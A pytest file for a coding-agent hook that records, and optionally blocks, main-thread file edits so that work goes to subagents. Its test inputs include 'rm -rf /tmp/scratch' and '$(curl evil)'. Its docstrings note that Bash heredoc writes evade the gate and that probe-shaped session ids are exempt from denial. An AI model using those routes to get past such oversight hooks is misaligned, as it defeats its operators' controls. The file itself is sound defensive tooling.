"""Tests for the orchestrator-only SIMULATE handler (Plan 00418, Phase 1).

Greenfield by owner ruling — this is not a revival of the archived
`CLAUDE/Plan/Cancelled/00032-.../archived-code/orchestrator_only.py`, which
was written before `PreToolUse` could tell a subagent call from a main-thread
one. `agent_id` is what changed: present only inside a subagent call (Task
1.1 confirmed this empirically against the live daemon — see the plan's
subagent report for the captured payloads).

The test that matters most is `test_no_match_when_agent_id_present`: it is
the exact failure that killed the original handler (it could not tell main
thread from subagent, so it blocked both). Everything else is secondary to
that one holding.

SIMULATE ONLY: `handle()` must never return `Decision.DENY`. There is no
blocking code path in this handler at all, so none can be reached by mistake
— these tests assert that property directly rather than trusting it.
"""

from typing import Any

from orchestrator_simulate import (
    BLOCKING_ENABLED,
    ORCHESTRATOR_WRITE_RULE_ID,
    OrchestratorSimulateHandler,
)

from claude_code_hooks_daemon.core.hook_result import Decision
from claude_code_hooks_daemon.daemon.synthetic_traffic import (
    MANUAL_PROBE,
    PROBE_AS_FIELD,
    SYNTHETIC_SOURCE_FIELD,
)


class TestOrchestratorSimulateHandlerInit:
    def setup_method(self) -> None:
        self.handler = OrchestratorSimulateHandler()

    def test_init(self) -> None:
        assert self.handler.name == "orchestrator-simulate"
        assert self.handler.terminal is False
        assert "project" in self.handler.tags
        assert "simulate" in self.handler.tags


class TestMatchesMainThreadNonCoordinationTools:
    """A main-thread call (no agent_id) to a work tool is flagged."""

    def setup_method(self) -> None:
        self.handler = OrchestratorSimulateHandler()

    def test_matches_bash(self, bash_hook_input: Any) -> None:
        hook_input = bash_hook_input("rm -rf /tmp/scratch")
        assert self.handler.matches(hook_input) is True

    def test_matches_bash_even_when_read_only_looking(self, bash_hook_input: Any) -> None:
        """Phase 1 deliberately does not pre-guess a read-only Bash carve-out.

        Settling which Bash commands count as coordination is Phase 2's job,
        answered from the simulated record — pre-filtering here would throw
        away exactly the data that decision needs.
        """
        hook_input = bash_hook_input("git status")
        assert self.handler.matches(hook_input) is True

    def test_matches_write(self, write_hook_input: Any) -> None:
        hook_input = write_hook_input("/workspace/src/thing.py", "content")
        assert self.handler.matches(hook_input) is True

    def test_matches_edit(self, edit_hook_input: Any) -> None:
        hook_input = edit_hook_input("/workspace/src/thing.py", "old", "new")
        assert self.handler.matches(hook_input) is True

    def test_matches_notebook_edit(self) -> None:
        hook_input = {
            "tool_name": "NotebookEdit",
            "tool_input": {"notebook_path": "/workspace/nb.ipynb"},
        }
        assert self.handler.matches(hook_input) is True

    def test_matches_unknown_tool(self) -> None:
        hook_input = {"tool_name": "SomeFutureTool", "tool_input": {}}
        assert self.handler.matches(hook_input) is True


class TestNoMatchWhenAgentIdPresent:
    """The test that matters: this is the exact failure that killed v1."""

    def setup_method(self) -> None:
        self.handler = OrchestratorSimulateHandler()

    def test_no_match_bash_with_agent_id(self, bash_hook_input: Any) -> None:
        hook_input = bash_hook_input("rm -rf /tmp/scratch")
        hook_input["agent_id"] = "agent-abc123"
        assert self.handler.matches(hook_input) is False

    def test_no_match_write_with_agent_id(self, write_hook_input: Any) -> None:
        hook_input = write_hook_input("/workspace/src/thing.py", "content")
        hook_input["agent_id"] = "agent-abc123"
        assert self.handler.matches(hook_input) is False

    def test_no_match_edit_with_agent_id(self, edit_hook_input: Any) -> None:
        hook_input = edit_hook_input("/workspace/src/thing.py", "old", "new")
        hook_input["agent_id"] = "agent-abc123"
        assert self.handler.matches(hook_input) is False

    def test_no_match_when_agent_id_is_present_but_agent_type_absent(
        self, bash_hook_input: Any
    ) -> None:
        """Gate strictly on `agent_id`, never on `agent_type`.

        The contract records `agent_type` as present both inside a subagent
        call AND on a main-thread call launched with `--agent` — so it is not
        a safe main-thread discriminator on its own. This handler never reads
        it at all, which this test pins: presence of `agent_id` alone must be
        sufficient to exempt the call.
        """
        hook_input = bash_hook_input("rm -rf /tmp/scratch")
        hook_input["agent_id"] = "agent-abc123"
        assert "agent_type" not in hook_input
        assert self.handler.matches(hook_input) is False


class TestNoMatchCoordinationTools:
    """Task/Agent, TodoWrite, Read and the search tools are obviously coordination."""

    def setup_method(self) -> None:
        self.handler = OrchestratorSimulateHandler()

    def test_no_match_task(self) -> None:
        hook_input = {"tool_name": "Task", "tool_input": {}}
        assert self.handler.matches(hook_input) is False

    def test_no_match_agent(self) -> None:
        hook_input = {"tool_name": "Agent", "tool_input": {}}
        assert self.handler.matches(hook_input) is False

    def test_no_match_todo_write(self) -> None:
        hook_input = {"tool_name": "TodoWrite", "tool_input": {}}
        assert self.handler.matches(hook_input) is False

    def test_no_match_read(self) -> None:
        hook_input = {"tool_name": "Read", "tool_input": {"file_path": "/workspace/x.py"}}
        assert self.handler.matches(hook_input) is False

    def test_no_match_glob(self) -> None:
        hook_input = {"tool_name": "Glob", "tool_input": {"pattern": "*.py"}}
        assert self.handler.matches(hook_input) is False

    def test_no_match_grep(self) -> None:
        hook_input = {"tool_name": "Grep", "tool_input": {"pattern": "foo"}}
        assert self.handler.matches(hook_input) is False

    def test_no_match_send_message(self) -> None:
        hook_input = {"tool_name": "SendMessage", "tool_input": {}}
        assert self.handler.matches(hook_input) is False

    def test_no_match_web_search(self) -> None:
        hook_input = {"tool_name": "WebSearch", "tool_input": {}}
        assert self.handler.matches(hook_input) is False

    def test_no_match_web_fetch(self) -> None:
        hook_input = {"tool_name": "WebFetch", "tool_input": {}}
        assert self.handler.matches(hook_input) is False

    def test_no_match_ask_user_question(self) -> None:
        hook_input = {"tool_name": "AskUserQuestion", "tool_input": {}}
        assert self.handler.matches(hook_input) is False

    def test_no_match_enter_plan_mode(self) -> None:
        hook_input = {"tool_name": "EnterPlanMode", "tool_input": {}}
        assert self.handler.matches(hook_input) is False

    def test_no_match_exit_plan_mode(self) -> None:
        hook_input = {"tool_name": "ExitPlanMode", "tool_input": {}}
        assert self.handler.matches(hook_input) is False

    def test_no_match_skill(self) -> None:
        hook_input = {"tool_name": "Skill", "tool_input": {}}
        assert self.handler.matches(hook_input) is False


class TestNoMatchMissingToolName:
    def setup_method(self) -> None:
        self.handler = OrchestratorSimulateHandler()

    def test_no_match_empty_tool_name(self) -> None:
        assert self.handler.matches({"tool_name": "", "tool_input": {}}) is False

    def test_no_match_missing_tool_name(self) -> None:
        assert self.handler.matches({"tool_input": {}}) is False


class TestHandleNeverDenies:
    """Nothing is ever denied in simulate mode — there is no path that can DENY."""

    def setup_method(self) -> None:
        self.handler = OrchestratorSimulateHandler()

    def test_handle_bash_allows(self, bash_hook_input: Any) -> None:
        hook_input = bash_hook_input("rm -rf /tmp/scratch")
        result = self.handler.handle(hook_input)
        assert result.decision == Decision.ALLOW

    def test_handle_write_allows(self, write_hook_input: Any) -> None:
        hook_input = write_hook_input("/workspace/src/thing.py", "content")
        result = self.handler.handle(hook_input)
        assert result.decision == Decision.ALLOW

    def test_handle_edit_allows(self, edit_hook_input: Any) -> None:
        hook_input = edit_hook_input("/workspace/src/thing.py", "old", "new")
        result = self.handler.handle(hook_input)
        assert result.decision == Decision.ALLOW

    def test_handle_never_denies_anything_in_the_default_mode(self) -> None:
        """The default is simulate, and simulate cannot deny ANY tool.

        Phase 1 pinned this structurally (the module carried no DENY token at
        all). Task 2.2 added an opt-in blocking mode, so the structural
        version of the claim is gone and only the behavioural one is left —
        which means it has to be asserted over the whole tool surface rather
        than over the three shapes that happened to be convenient.
        """
        for tool_name, tool_input in (
            ("Bash", {"command": "rm -rf /tmp/scratch"}),
            ("Write", {"file_path": "/workspace/src/thing.py", "content": "x"}),
            ("Edit", {"file_path": "/workspace/src/thing.py", "new_string": "x"}),
            ("NotebookEdit", {"notebook_path": "/workspace/nb.ipynb"}),
            ("SomeFutureTool", {}),
        ):
            hook_input = {"tool_name": tool_name, "tool_input": tool_input}
            assert self.handler.handle(hook_input).decision == Decision.ALLOW, tool_name

    def test_handle_context_names_the_tool_and_says_simulated(self, bash_hook_input: Any) -> None:
        hook_input = bash_hook_input("rm -rf /tmp/scratch")
        result = self.handler.handle(hook_input)
        joined = " ".join(result.context)
        assert "SIMULATED" in joined
        assert "Bash" in joined

    def test_handle_context_includes_bash_command_detail(self, bash_hook_input: Any) -> None:
        hook_input = bash_hook_input("rm -rf /tmp/scratch")
        result = self.handler.handle(hook_input)
        joined = " ".join(result.context)
        assert "rm -rf /tmp/scratch" in joined

    def test_handle_context_includes_file_path_detail(self, write_hook_input: Any) -> None:
        hook_input = write_hook_input("/workspace/src/thing.py", "content")
        result = self.handler.handle(hook_input)
        joined = " ".join(result.context)
        assert "/workspace/src/thing.py" in joined


class TestBashClassification:
    """Task 2.1: the record must be able to classify Bash, or it settles nothing.

    Phase 1 gathered 640 would-be denials and the boundary stayed unsettled,
    because 63% of them were Bash and `verdicts.jsonl` stores `tool` without
    the command. `git status` and a QA run are both "Bash"; one is
    coordination and one is work, and the record could not tell them apart.

    The fix reuses the field that already exists for exactly this —
    `HookResult.rule`, the handler-set sub-classification (pipe_blocker's
    "blacklisted" vs "unknown") — so no new log, no new file, and nothing
    written that was not already written.

    **The label is command HEADS only.** No arguments, no paths, no values.
    That is both a privacy floor and the right granularity: `git status` vs
    `git commit` is the distinction the decision turns on, and the rest of the
    command line cannot help it.
    """

    def setup_method(self) -> None:
        self.handler = OrchestratorSimulateHandler()

    def _rule(self, bash_hook_input: Any, command: str) -> Any:
        return self.handler.handle(bash_hook_input(command)).rule

    def test_a_bare_command_is_its_own_label(self, bash_hook_input: Any) -> None:
        assert self._rule(bash_hook_input, "pytest tests/") == "pytest"

    def test_a_subcommand_tool_keeps_its_subcommand(self, bash_hook_input: Any) -> None:
        # The whole point: these two are opposite sides of the boundary and
        # both are "Bash".
        assert self._rule(bash_hook_input, "git status") == "git status"
        assert self._rule(bash_hook_input, "git commit -m 'x'") == "git commit"

    def test_a_path_is_reduced_to_its_basename(self, bash_hook_input: Any) -> None:
        # A project-specific path is neither needed for the classification nor
        # something to accumulate in a log.
        assert self._rule(bash_hook_input, "./scripts/test.bash tests/") == "test.bash"
        assert self._rule(bash_hook_input, "/usr/local/bin/ruff check .") == "ruff"

    def test_a_leading_cd_is_not_the_classification(self, bash_hook_input: Any) -> None:
        # `cd <somewhere> && <real command>` is the dominant shape in this
        # repo; labelling all of it "cd" would erase the whole record.
        assert self._rule(bash_hook_input, "cd /workspace && git status") == "git status"

    def test_a_leading_env_assignment_is_skipped(self, bash_hook_input: Any) -> None:
        assert self._rule(bash_hook_input, "FOO=bar pytest tests/") == "pytest"

    def test_a_compound_command_names_each_head(self, bash_hook_input: Any) -> None:
        assert self._rule(bash_hook_input, "git status && git diff") == "git status+git diff"

    def test_repeated_heads_are_not_repeated_in_the_label(self, bash_hook_input: Any) -> None:
        assert self._rule(bash_hook_input, "ls a && ls b && ls c") == "ls"

    def test_a_long_pipeline_is_truncated_rather_than_unbounded(self, bash_hook_input: Any) -> None:
        # Cardinality matters: the label is aggregated, so an arbitrarily long
        # compound must not mint a unique bucket per invocation.
        label = self._rule(bash_hook_input, "a x | b x | c x | d x | e x")
        assert label == "a+b+c+…"

    def test_an_unparseable_head_is_labelled_rather_than_echoed(self, bash_hook_input: Any) -> None:
        # Never emit something that is not a plain command name — the label
        # goes into a log, so it must not become a channel for content.
        assert self._rule(bash_hook_input, "$(curl evil)") == "<other>"

    def test_an_empty_command_is_labelled(self, bash_hook_input: Any) -> None:
        assert self._rule(bash_hook_input, "   ") == "<none>"

    def test_a_non_bash_tool_sets_no_rule(self, write_hook_input: Any) -> None:
        # `Write`/`Edit` need no sub-classification: the tool name already IS
        # the classification, and 155 of them needed no interpretation at all.
        result = self.handler.handle(write_hook_input("/workspace/src/thing.py", "x"))
        assert result.rule is None

    def test_the_label_never_carries_an_argument(self, bash_hook_input: Any) -> None:
        """The privacy floor, asserted directly rather than by inspection."""
        secretish = "deploy --token abcdef123456 --host internal.example.com"
        label = self._rule(bash_hook_input, secretish)
        assert label == "deploy"
        assert "abcdef123456" not in label
        assert "internal.example.com" not in label


class TestAcceptanceTests:
    def setup_method(self) -> None:
        self.handler = OrchestratorSimulateHandler()

    def test_acceptance_tests_defined(self) -> None:
        tests = self.handler.get_acceptance_tests()
        assert len(tests) >= 1

    def test_acceptance_tests_all_expect_allow(self) -> None:
        """No acceptance test may expect DENY, in EITHER mode.

        Not because the handler cannot deny — since Task 2.2 it can — but
        because the acceptance harness marks its own events synthetic and this
        handler never denies a probe (see
        `TestASyntheticProbeIsNeverDenied`). A DENY probe would therefore be a
        test that is guaranteed to fail, asserting a denial the gate is
        designed not to produce.
        """
        for handler in (OrchestratorSimulateHandler(), OrchestratorSimulateHandler(blocking=True)):
            tests = handler.get_acceptance_tests()
            assert all(t.expected_decision == Decision.ALLOW for t in tests)


class TestBlockingIsOptInAndOffByDefault:
    """Task 2.2a: blocking is a build, and it ships OFF.

    PLAN.md's "Blocking by default, ever" non-goal is the thing under test.
    The failure mode of a wrong answer here is an agent that cannot work at
    all, so the default has to be provably simulate rather than
    conventionally so.
    """

    def test_the_module_switch_is_off(self) -> None:
        assert BLOCKING_ENABLED is False

    def test_a_default_handler_allows_a_main_thread_implementation_write(
        self, write_hook_input: Any
    ) -> None:
        handler = OrchestratorSimulateHandler()
        result = handler.handle(write_hook_input("/workspace/src/thing.py", "x"))
        assert result.decision == Decision.ALLOW

    def test_a_default_handler_is_not_tagged_blocking(self) -> None:
        """The generated CLAUDE.md groups by tag; a simulating handler that
        advertised itself as blocking would teach the wrong rule."""
        handler = OrchestratorSimulateHandler()
        assert "blocking" not in handler.tags
        assert "advisory" in handler.tags

    def test_a_default_handler_declares_no_rule(self) -> None:
        """A rule row in CLAUDE.md is a promise that the rule can fire."""
        assert OrchestratorSimulateHandler().get_rules() == []

    def test_a_blocking_handler_is_tagged_blocking_and_declares_its_rule(self) -> None:
        handler = OrchestratorSimulateHandler(blocking=True)
        assert "blocking" in handler.tags
        rules = handler.get_rules()
        assert [rule.rule_id for rule in rules] == [ORCHESTRATOR_WRITE_RULE_ID]


class TestBlockingDeniesMainThreadFileMutation:
    """Ruling 1: the boundary is drawn on tool identity, not on Bash.

    73% of the real session's main-thread edits were implementation work —
    exactly what the plan exists to push to subagents.
    """

    def setup_method(self) -> None:
        self.handler = OrchestratorSimulateHandler(blocking=True)

    def test_write_is_denied(self, write_hook_input: Any) -> None:
        result = self.handler.handle(write_hook_input("/workspace/src/thing.py", "x"))
        assert result.decision == Decision.DENY

    def test_edit_is_denied(self, edit_hook_input: Any) -> None:
        result = self.handler.handle(edit_hook_input("/workspace/src/thing.py", "old", "new"))
        assert result.decision == Decision.DENY

    def test_notebook_edit_is_denied(self) -> None:
        hook_input = {
            "tool_name": "NotebookEdit",
            "tool_input": {"notebook_path": "/workspace/nb.ipynb"},
        }
        assert self.handler.handle(hook_input).decision == Decision.DENY

    def test_the_deny_reason_carries_the_stable_rule_id(self, write_hook_input: Any) -> None:
        """A rule ID is a public contract: it is what `explain-rule` resolves
        and what an agent can search for. A deny with no identifier is a deny
        nobody can look up."""
        result = self.handler.handle(write_hook_input("/workspace/src/thing.py", "x"))
        assert ORCHESTRATOR_WRITE_RULE_ID in (result.reason or "")

    def test_the_deny_reason_says_how_to_proceed(self, write_hook_input: Any) -> None:
        """A gate that says only "no" costs a turn to nothing."""
        reason = self.handler.handle(write_hook_input("/workspace/src/thing.py", "x")).reason or ""
        assert "Task" in reason

    def test_an_unknown_future_tool_is_recorded_but_not_denied(self) -> None:
        """Simulate flags everything it does not recognise; BLOCKING is scoped
        to the three named file-mutating tools and nothing else. Denying an
        unrecognised tool would be guessing about a capability that does not
        exist yet, on a gate whose wrong answer stops all work."""
        hook_input = {"tool_name": "SomeFutureTool", "tool_input": {}}
        assert self.handler.matches(hook_input) is True
        assert self.handler.handle(hook_input).decision == Decision.ALLOW


class TestBashIsNeverDenied:
    """Arithmetic, not taste, and NOT the owner's to re-decide.

    93% of the real session's Bash calls run several commands at once and 22%
    straddle the boundary WITHIN one invocation (`set+git add+git commit`), so
    no per-call verdict on a Bash head can be right about both halves.
    """

    def setup_method(self) -> None:
        self.handler = OrchestratorSimulateHandler(blocking=True)

    def test_a_destructive_bash_call_is_still_allowed(self, bash_hook_input: Any) -> None:
        result = self.handler.handle(bash_hook_input("rm -rf /tmp/scratch"))
        assert result.decision == Decision.ALLOW

    def test_a_bash_heredoc_write_is_allowed_even_though_it_evades_the_gate(
        self, bash_hook_input: Any
    ) -> None:
        """The gate is porous by construction and that is accepted: it is a
        BEHAVIOURAL gate for context hygiene, not a security one. The command
        label is the instrument that would show evasion rising."""
        result = self.handler.handle(bash_hook_input("cat > /workspace/src/thing.py <<'EOF'"))
        assert result.decision == Decision.ALLOW
        assert result.rule == "cat"

    def test_a_compound_command_is_still_classified_while_blocking(
        self, bash_hook_input: Any
    ) -> None:
        result = self.handler.handle(bash_hook_input("git status && git diff"))
        assert result.rule == "git status+git diff"


class TestThePlanDirectoryIsExempt:
    """The lead owns its own plan folder, by this project's directory roles.

    Denying these writes buys no context hygiene (a journal entry is small)
    and pushes the lead into `cat >> JOURNAL` heredocs — the exact route this
    project's CLAUDE.md says bypasses every content guard.
    """

    def setup_method(self) -> None:
        self.handler = OrchestratorSimulateHandler(blocking=True)

    def test_a_plan_document_is_allowed(self, write_hook_input: Any) -> None:
        result = self.handler.handle(
            write_hook_input("/workspace/CLAUDE/Plan/00418-orchestrator/PLAN.md", "x")
        )
        assert result.decision == Decision.ALLOW

    def test_a_journal_day_file_is_allowed(self, write_hook_input: Any) -> None:
        result = self.handler.handle(
            write_hook_input("/workspace/CLAUDE/Plan/00418-x/JOURNAL/00418-Journal-26-09-16.md", "")
        )
        assert result.decision == Decision.ALLOW

    def test_the_plan_index_is_allowed(self, edit_hook_input: Any) -> None:
        result = self.handler.handle(
            edit_hook_input("/workspace/CLAUDE/Plan/README.md", "old", "new")
        )
        assert result.decision == Decision.ALLOW

    def test_an_archived_plan_is_allowed(self, edit_hook_input: Any) -> None:
        result = self.handler.handle(
            edit_hook_input("/workspace/CLAUDE/Plan/Completed/00001-x/PLAN.md", "o", "n")
        )
        assert result.decision == Decision.ALLOW

    def test_the_exemption_survives_a_worktree_path(self, write_hook_input: Any) -> None:
        """Every path this gate sees in practice is absolute and most are in a
        worktree, so a repo-root-relative prefix test would exempt nothing."""
        result = self.handler.handle(
            write_hook_input(
                "/workspace/.claude/worktrees/agent-abc/CLAUDE/Plan/00418-x/PLAN.md", "x"
            )
        )
        assert result.decision == Decision.ALLOW

    def test_a_plan_directory_elsewhere_in_the_tree_is_not_exempt(
        self, write_hook_input: Any
    ) -> None:
        """`Plan` is exempt because `CLAUDE/Plan` is the declared plan root,
        not because the word appears in the path."""
        result = self.handler.handle(write_hook_input("/workspace/src/Plan/thing.py", "x"))
        assert result.decision == Decision.DENY

    def test_scratch_is_deliberately_not_exempt(self, write_hook_input: Any) -> None:
        """Nothing designates the lead the author of a scratch file. Whether
        that hurts is a question the blocking record answers."""
        result = self.handler.handle(write_hook_input("/workspace/untracked/scratch/notes.md", "x"))
        assert result.decision == Decision.DENY

    def test_an_agent_docs_write_is_not_exempt(self, edit_hook_input: Any) -> None:
        result = self.handler.handle(edit_hook_input("/workspace/CLAUDE/QA.md", "o", "n"))
        assert result.decision == Decision.DENY


class TestASubagentIsStillUnaffectedWhileBlocking:
    """The exact failure that killed v1, re-asserted with teeth on.

    Simulate could get this wrong at no cost. Blocking cannot: an `agent_id`
    misread here makes agent teams unusable, which is precisely why the
    original handler was deleted.
    """

    def setup_method(self) -> None:
        self.handler = OrchestratorSimulateHandler(blocking=True)

    def test_a_subagent_write_does_not_even_match(self, write_hook_input: Any) -> None:
        hook_input = write_hook_input("/workspace/src/thing.py", "x")
        hook_input["agent_id"] = "agent-abc123"
        assert self.handler.matches(hook_input) is False

    def test_a_subagent_write_is_allowed_if_handle_is_reached_anyway(
        self, write_hook_input: Any
    ) -> None:
        """Defence in depth: `matches()` is the gate, but a caller that skips
        it (a test, a future dispatch change) must not get a denial."""
        hook_input = write_hook_input("/workspace/src/thing.py", "x")
        hook_input["agent_id"] = "agent-abc123"
        assert self.handler.handle(hook_input).decision == Decision.ALLOW


class TestASyntheticProbeIsNeverDenied:
    """Task 2.2a precondition 2, and it is not hypothetical.

    The acceptance playbook builds events with no `agent_id`, so a naively
    written blocking mode would deny every `Write`/`Edit` probe — 280 of them
    at the snapshot — and, under most-restrictive-wins, turn other handlers'
    expected ALLOW outcomes into failures. The acceptance harness would go red
    on the day blocking was enabled.
    """

    def setup_method(self) -> None:
        self.handler = OrchestratorSimulateHandler(blocking=True)

    def test_a_marked_probe_is_allowed(self, write_hook_input: Any) -> None:
        hook_input = write_hook_input("/workspace/src/thing.py", "x")
        hook_input["synthetic_source"] = "playbook-probe"
        assert self.handler.handle(hook_input).decision == Decision.ALLOW

    def test_an_unmarked_probe_session_is_allowed(self, write_hook_input: Any) -> None:
        """The session-shape fallback covers a producer this repo does not own."""
        hook_input = write_hook_input("/workspace/src/thing.py", "x")
        hook_input["session_id"] = "playbook-probe-r1-7"
        assert self.handler.handle(hook_input).decision == Decision.ALLOW

    def test_the_socket_integration_test_session_is_allowed(self, write_hook_input: Any) -> None:
        hook_input = write_hook_input("/workspace/src/thing.py", "x")
        hook_input["session_id"] = "socket-stdin-test"
        assert self.handler.handle(hook_input).decision == Decision.ALLOW

    def test_a_real_session_is_still_denied(self, write_hook_input: Any) -> None:
        """The control: without it, "no probe was denied" is indistinguishable
        from "nothing was denied at all"."""
        hook_input = write_hook_input("/workspace/src/thing.py", "x")
        hook_input["session_id"] = "9679b063-1111-2222"
        assert self.handler.handle(hook_input).decision == Decision.DENY

    def test_a_manual_probe_standing_for_the_main_thread_is_judged(
        self, write_hook_input: Any
    ) -> None:
        """Plan 00466 N12: `hooks-daemon probe --as main` is how this handler is
        probed without the probe being logged as a real main-thread write. The
        same `probe_as` rule the scope gate uses decides here."""
        hook_input = write_hook_input("/workspace/src/thing.py", "x")
        hook_input[SYNTHETIC_SOURCE_FIELD] = MANUAL_PROBE
        hook_input[PROBE_AS_FIELD] = "main"
        assert self.handler.handle(hook_input).decision == Decision.DENY

    def test_a_harness_probe_claiming_the_main_thread_is_still_allowed(
        self, write_hook_input: Any
    ) -> None:
        """Only a probe-class source may name a thread; the harness keeps today's pass."""
        hook_input = write_hook_input("/workspace/src/thing.py", "x")
        hook_input[SYNTHETIC_SOURCE_FIELD] = "playbook-probe"
        hook_input[PROBE_AS_FIELD] = "main"
        assert self.handler.handle(hook_input).decision == Decision.ALLOW
